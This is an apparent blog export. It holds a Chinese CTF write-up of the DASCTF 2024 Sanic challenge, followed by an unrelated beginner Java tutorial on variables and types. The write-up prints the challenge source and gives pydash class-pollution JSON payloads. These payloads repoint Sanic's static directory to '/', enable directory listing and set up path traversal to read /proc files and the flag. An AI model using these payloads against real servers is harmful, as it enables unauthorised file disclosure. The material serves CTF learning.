<p>这段json代码就是将file_or_directory设置为”&#x2F;“我的基础还是很薄弱所以我们分析这个payload</p>
<ol>
<li><p><strong><code>__class__</code></strong>: 访问当前对象的类。</p>
</li>
<li><p><strong><code>__init__</code></strong>: 访问类的构造函数。</p>
</li>
<li><p><strong><code>__globals__</code></strong>: 访问构造函数的全局命名空间，这允许攻击者访问应用的全局变量。</p>
</li>
<li><p><strong><code>app.router.name_index.__mp_main__</code></strong>: 试图访问Sanic应用的路由器中的<code>name_index</code>，其中<code>__mp_main__</code>表示模块的名称。</p>
</li>
<li><p><strong><code>.static.handler.keywords.file_or_directory</code></strong>: 最终目标是访问并修改静态文件处理器的<code>file_or_directory</code>属性。</p>
</li>
<li><p><code>&quot;/&quot;</code>: 设置的值为根目录。（补充  ：</p>
<p><code>file_or_directory</code> 这个属性的作用通常是用于指示文件处理器处理的是文件还是目录。攻击者试图通过修改 <code>file_or_directory</code> 属性，将其值设置为 <code>&quot;/&quot;</code>，可能导致服务器将根目录作为静态文件目录，从而暴露服务器上的敏感文件和目录。这种攻击利用了对关键属性缺乏适当验证和保护的漏洞。<br>）就可以实现任意文件读取</p>
</li>
</ol>
<p><img src="/imgs/8.png"></p>
<p>回显success，表面成功了</p>
<p>接着我们访问&#x2F;static&#x2F;proc&#x2F;1&#x2F;cmdline</p>
<p>inux系统中的<code>/proc</code>文件系统的路径，并通过应用的静态文件服务暴露出来</p>
<ul>
<li>**<code>/proc/1/cmdline</code>**：这是一个文件，包含启动进程ID为1的进程时使用的命令行参数。</li>
</ul>
<p><img src="/imgs/9.png"></p>
<p>显示当前的启动路径为&#x2F;bin&#x2F;bash&#x2F;start.sh</p>
<p>我们继续打开这个路径</p>
<p><img src="/imgs/10.png"></p>
<p>发现运行的py脚本</p>
<p><img src="/imgs/11.png"></p>
<p>给了丢失的源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"></span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#源码好像被admin删掉了一些，听他说里面藏有大秘密</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_log_dir</span>(<span class="params">n</span>):</span><br><span class="line">        ret = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            num = random.randint(<span class="number">0</span>, <span class="number">9</span>)</span><br><span class="line">            letter = <span class="built_in">chr</span>(random.randint(<span class="number">97</span>, <span class="number">122</span>))</span><br><span class="line">            Letter = <span class="built_in">chr</span>(random.randint(<span class="number">65</span>, <span class="number">90</span>))</span><br><span class="line">            s = <span class="built_in">str</span>(random.choice([num, letter, Letter]))</span><br><span class="line">            ret += s</span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line">        </span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/Wa58a1qEQ59857qQRPPQ&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">secret</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/h111int&quot;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">       hint=f.read()</span><br><span class="line">    <span class="keyword">return</span> text(hint)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/adminLook&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">AdminLook</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="comment">#方便管理员查看非法日志</span></span><br><span class="line">    log_dir=os.popen(<span class="string">&#x27;ls /tmp -al&#x27;</span>).read();</span><br><span class="line">    <span class="keyword">return</span> text(log_dir)</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/pollute&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">POLLUTE</span>(<span class="params">request</span>):</span><br><span class="line">    key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">    value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;parts&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key <span class="keyword">and</span> <span class="string">&#x27;proc&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(value) <span class="keyword">and</span> <span class="built_in">type</span>(value) <span class="keyword">is</span> <span class="keyword">not</span> <span class="built_in">list</span>:</span><br><span class="line">        pollute = Pollute()</span><br><span class="line">        pydash.set_(pollute, key, value)</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        log_dir=create_log_dir(<span class="number">6</span>)</span><br><span class="line">        log_dir_bak=log_dir+<span class="string">&quot;..&quot;</span></span><br><span class="line">        log_file=<span class="string">&quot;/tmp/&quot;</span>+log_dir+<span class="string">&quot;/access.log&quot;</span></span><br><span class="line">        log_file_bak=<span class="string">&quot;/tmp/&quot;</span>+log_dir_bak+<span class="string">&quot;/access.log.bak&quot;</span></span><br><span class="line">        log=<span class="string">&#x27;key: &#x27;</span>+<span class="built_in">str</span>(key)+<span class="string">&#x27;|&#x27;</span>+<span class="string">&#x27;value: &#x27;</span>+<span class="built_in">str</span>(value);</span><br><span class="line">        <span class="comment">#生成日志文件</span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span>+log_dir)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">             f.write(log)</span><br><span class="line">        <span class="comment">#备份日志文件</span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span>+log_dir_bak)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file_bak, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">             f.write(log)</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;！！！此地禁止胡来，你的非法操作已经被记录！！！&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/Wa58a1qEQ59857qQRPPQ&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">secret</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/h111int&quot;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">       hint=f.read()</span><br><span class="line">    <span class="keyword">return</span> text(hint)</span><br></pre></td></tr></table></figure>

<p>他这个给了secret的路径</p>
<p>访问看看</p>
<p><img src="/imgs/12.png"></p>
<p>他说flag在app路由下，但是不知道他的名字 让我们找</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/adminLook&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">AdminLook</span>(<span class="params">request</span>):</span><br></pre></td></tr></table></figure>

<p>还给了&#x2F;adminLook的路由</p>
<p><img src="/imgs/13.png"></p>
<p>我们传入恶意的key 比如part 这一步很重要到后面来解释</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.parts&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>传入后我们发现多了两个文件</p>
<p><img src="/imgs/14.png"></p>
<p>有点不一样是因为靶机过期了重新打开了</p>
<p>我们先切换到&#x2F;tmp目录</p>
<p><img src="/imgs/15.png"></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.file_or_directory&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/tmp&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>#对base属性进行污染</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.base&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;static/4KDN4B&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>#打开目录功能</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>访问static&#x2F;4KDN4B..&#x2F;</p>
<p><img src="/imgs/16.png" alt="image-20240723165717529"></p>
<p>最后得到flag的名字直接访问就好</p>
<p>在把静态文件目录换成为根目录</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.file_or_directory&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>之前知道flag在app路由下</p>
<p>&#x2F;static&#x2F;app&#x2F;45W698WqtsgQT1_flag</p>
<p><img src="/imgs/17.png"></p>
<p>接下来解释上面遗留的问题</p>
<p>那么为什么要恶意操作被后台日志记录呢？</p>
<p>这里复现完了我先把大佬的wp链接放出来，因为我水平有限，基本上就是照着大佬wp来进行复现</p>
<p>有点为了复现而复现的丑陋感，到后面我会慢慢补好基础的┭┮﹏┭┮</p>
<p><a href="https://www.cnblogs.com/gxngxngxn/p/18290489">https://www.cnblogs.com/gxngxngxn/p/18290489</a></p>
<p><a href="https://dawnrisingdong.github.io/2024/07/22/DASCTF-2024%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B-Sanic-s-revenge%E5%A4%8D%E7%8E%B0/#%E8%A7%A3%E9%A2%98">https://dawnrisingdong.github.io/2024/07/22/DASCTF-2024%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B-Sanic-s-revenge%E5%A4%8D%E7%8E%B0/#%E8%A7%A3%E9%A2%98</a></p>
<p><a href="https://blog.csdn.net/2301_79700060/article/details/140632405">https://blog.csdn.net/2301_79700060/article/details/140632405</a></p>
<p><a href="https://blog.csdn.net/qq_66013948/article/details/140582003?spm=1001.2014.3001.5502">https://blog.csdn.net/qq_66013948/article/details/140582003?spm=1001.2014.3001.5502</a></p>
<p>那么我们从</p>
<p>[<strong>gxngxngxn]</strong></p>
<p>大佬的文章来解释下</p>
<p>这套题目其实是ciscn2024 改的一道题目，先放链接</p>
<p><a href="https://www.cnblogs.com/gxngxngxn/p/18205235">https://www.cnblogs.com/gxngxngxn/p/18205235</a></p>
<p>国赛 sanic的源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="keyword">from</span> sanic_session <span class="keyword">import</span> Session</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line">Session(app)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    user = request.cookies.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> user.lower() == <span class="string">&#x27;adm;n&#x27;</span>:</span><br><span class="line">        request.ctx.session[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;login success&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;login fail&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/src&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">src</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> text(<span class="built_in">open</span>(__file__).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">admin</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.ctx.session.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="literal">True</span>:</span><br><span class="line">        key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">        value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;_.&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">            pollute = Pollute()</span><br><span class="line">            pydash.set_(pollute, key, value)</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>&#x2F;admin 路由那块就是编码成八进制可以进入&#x2F;login,而且需要绕过waf大佬文章都讲了</p>
<p>直接看sanic那块污染链寻找</p>
<p>我们可以污染__file__然后进行任意文件读取，但是我们不知道flag的位置所以可以开启目录功能，有关的两个函数</p>
<p><strong>directory_view</strong> <strong>directory_handler</strong></p>
<p>只要我们将directory污染为根目录，directory_view污染为True，就可以看到根目录的所有文件了</p>
<p>这个框架可以通过**app.router.name_index[‘xxxxx’]**来获取注册的路由</p>
<p>获得这个路由之后我们需要调用到DirectoryHandler里</p>
<p>我们可以用<strong>name_index</strong>方法发现可以从handler入手，一直可以获取到DirectoryHandler中的directory和directory_view</p>
<p>从而实现污染达到列目录的目的</p>
<p>然后接下里就是污染directory</p>
<p>但是directory是一个对象，而它之前的值就是由其中的<strong>parts</strong>属性决定的，但是由于这个属性是一个tuple，不能直接被污染，所以我们需要找到这个属性是如何被赋值的?（这里我们需要知道tuple(元组：元组是 Python 中的一种数据结构，用于存储多个元素。与列表类似，元组也是一个序列，但与列表不同的是，元组是不可变的。这意味着元组一旦创建，其内容不能修改)）</p>
<p>所以不能直接污染directory </p>
<p>但在DirectoryHandler类中有Directory属性可以从这入手进入path对象parts的值最后是给了_parts这个属性发现是list</p>
<p>最终污染成&#x2F;就成功了</p>
<p>到时候要去复现下国赛ciscn毕竟那天坐了一天牢</p>
<p>到这还没完还没</p>
<p>我们继续看DirectoryHandler类中handle方法中的逻辑:</p>
<p>当我们开启列目录功能后，就会进入</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="variable language_">self</span>._index(    <span class="variable language_">self</span>.directory / current, path, request.app.debug )</span><br></pre></td></tr></table></figure>

<p>解决上面遗留的问题就是从这开始发现这个目录路径是由Parts+current拼接出来的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">self</span>.directory / current,path, request.app .debug</span><br></pre></td></tr></table></figure>

<p>目的就是让current变成.. 实现目录穿越</p>
<p>看下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">current = path.strip(<span class="string">&quot;/&quot;</span>)[<span class="built_in">len</span>(<span class="variable language_">self</span>.base) :].strip(<span class="string">&quot;/&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">从给定的路径中去除基本路径（`self.base`），然后返回剩余路径。首先，`path.strip(&quot;/&quot;)` 去除路径两端的斜杠，然后`[len(self.base):]` 取基本路径之后的部分，最后`.strip(&quot;/&quot;)` 再次去除剩余路径两端的斜杠</span><br><span class="line"></span><br><span class="line">#可以看到current的值就是由path和base两个值决定的</span><br></pre></td></tr></table></figure>

<p>self.base是可控的</p>
<p><strong>那么我们就得构造current的值</strong></p>
<p>关键就在于下面</p>
<p>所以实现目录穿越只要让path的值为static&#x2F;一个目录&#x2F; current值为..就好了</p>
<p>但是这个目录怎么来？</p>
<p><strong>file_or_directory</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">可以改变静态文件的默认路径</span><br><span class="line"></span><br><span class="line">我们只需要通过这个改变到其他目录，该目录下存在其他目录不就好了</span><br></pre></td></tr></table></figure>

<p>它可以改变static的默认路径</p>
<p>这就是上面为什么需要传入恶意的key,目的就是让日志记录，获得一个报错的目录</p>
<p>继续改变目录位置（上面改的是&#x2F;tmp）然后修改其base的值为自己报错的目录</p>
<p>就看实现目录穿越了</p>
<p>ile_or_directory只是改变它识别的路径，并不会改变</p>
<p>self.directory中parts的值，这个列目录的值依旧是默认的</p>
]]></content>
      <categories>
        <category>pollute</category>
      </categories>
      <tags>
        <tag>复现</tag>
      </tags>
  </entry>
  <entry>
    <title>java基础</title>
    <url>/2024/09/10/java%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<p>1.安装jdk和IDEA</p>
<p>2.创建自己的第一个项目</p>
<p>3.编写自己的第一段代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Gu0f3n;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello.world&quot;</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//hello.world</span></span><br></pre></td></tr></table></figure>

<p>注释</p>
<p>单行注释 &#x2F; &#x2F;</p>
<p>多行注释&#x2F;**&#x2F;</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Gu0f3n;</span><br><span class="line"><span class="comment">//这是我的第一段代码</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test01</span> &#123;</span><br><span class="line">    <span class="comment">//main方法是程序的入口</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//在控制台上进行打印</span></span><br><span class="line">        System.out.println(<span class="string">&quot;hello,world&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;hello,world&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;hello,world&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;hello,world&quot;</span>);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">多行注释</span></span><br><span class="line"><span class="comment">随便打一些东西</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">常用快捷键：</span><br><span class="line">main方法快捷键：psvm+回车</span><br><span class="line">控制台原样输出：sout+回车</span><br><span class="line">删除一行：ctrl+y</span><br><span class="line">复制—行：ctrl+d</span><br></pre></td></tr></table></figure>

<h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>变量的含义</p>
<p>变量本质上就是代表一个”可操作的存储空间”，空间位置是确定<br>的，但是里面放置什么值不确定。我们可通过变量名来访问“对应<br>的存储空间”，从而操纵这个“存储空间”存储的值。Java是一种<br>强类型语言，每个变量都必须声明其数据类型。变量的数据类型决<br>定了变量占据存储空间的大小。</p>
<p>变量的学习</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">步骤1：变量的声明</span><br><span class="line">type varName [=value][,varName[=value]...];</span><br><span class="line">注意：变量不可以重复定义</span><br><span class="line">步骤2：变量的赋值</span><br><span class="line">注意：变量的声明和赋值可以在同一行表示</span><br><span class="line">步骤3：变量的使用</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TESTvar</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//1.变量的声明（定义）</span></span><br><span class="line">        <span class="comment">//定义一个名字的变量</span></span><br><span class="line">        String name;<span class="comment">//定义一个变量为name，类型为string</span></span><br><span class="line">        <span class="comment">// 注意：变量不可重复定义</span></span><br><span class="line">        <span class="type">int</span> a,b;<span class="comment">//同时可以定义多个变量</span></span><br><span class="line">        name=<span class="string">&quot;Gu0f3n&quot;</span>;<span class="comment">//等号赋值</span></span><br><span class="line">        <span class="comment">//2.变量的赋值</span></span><br><span class="line">        <span class="type">int</span> age;</span><br><span class="line">        age=<span class="number">18</span>;<span class="comment">//等号赋值</span></span><br><span class="line">        age=<span class="number">32</span>;</span><br><span class="line">        age=<span class="number">40</span>+<span class="number">18</span>;</span><br><span class="line">        <span class="comment">//变量的定义和复制可以写在同一行</span></span><br><span class="line">        <span class="type">int</span> age1=<span class="number">19</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span><span class="number">10</span>;</span><br><span class="line">        <span class="type">int</span> e,f =<span class="number">30</span>;<span class="comment">//e没有赋值，f赋值30</span></span><br><span class="line">        <span class="comment">//变量的使用</span></span><br><span class="line">        System.out.println(age);<span class="comment">//使用变量的时候通过名字访问到空间中具体的值</span></span><br><span class="line">        <span class="type">int</span> g=<span class="number">20</span>;</span><br><span class="line">        System.out.println(age+g);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">控制台的打印结果</span></span><br><span class="line"><span class="comment">58</span></span><br><span class="line"><span class="comment">78</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>数据类型的分类</p>
<p>Java是一种强类型语言，每个变量都必须声明其数据类型<br>Java的数据类型可分为两大类：基本数据类型（primitivedata<br>type）和弓l用数据类型（reference data type）</p>
<p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/image_19.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TESTtype</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//基本数据类型</span></span><br><span class="line">        <span class="comment">//1.整数类型</span></span><br><span class="line">        <span class="type">byte</span> <span class="variable">a</span> <span class="operator">=</span><span class="number">10</span>;<span class="comment">//表述范围-128~127</span></span><br><span class="line">        <span class="type">short</span> <span class="variable">b</span> <span class="operator">=</span><span class="number">22000</span>;<span class="comment">//表述范围：正负三万</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span><span class="number">30123131</span>;<span class="comment">//正负21亿</span></span><br><span class="line">        <span class="type">long</span> <span class="variable">d</span> <span class="operator">=</span><span class="number">401215151513131513L</span>;<span class="comment">//表述范围 很大 如果表示的数的范围超过intl类型范围就需要加L</span></span><br><span class="line">        <span class="comment">//2.浮点类型</span></span><br><span class="line">        <span class="type">float</span> <span class="variable">e</span> <span class="operator">=</span><span class="number">3.14f</span>;<span class="comment">//如果float表示一个小数，后面必须加上f</span></span><br><span class="line">        <span class="type">double</span> <span class="variable">f</span> <span class="operator">=</span><span class="number">4.56789</span>;</span><br><span class="line">        <span class="comment">//3.字符类型</span></span><br><span class="line">        <span class="type">char</span> <span class="variable">g</span> <span class="operator">=</span><span class="string">&#x27;a&#x27;</span>;<span class="comment">//单引号引起来的单个字符</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Gu0f3n&quot;</span>);<span class="comment">//后续的字符串</span></span><br><span class="line">        <span class="comment">//4.布尔类型</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span><span class="literal">true</span>;<span class="comment">//true and false</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/image_27.png" alt="img"></p>
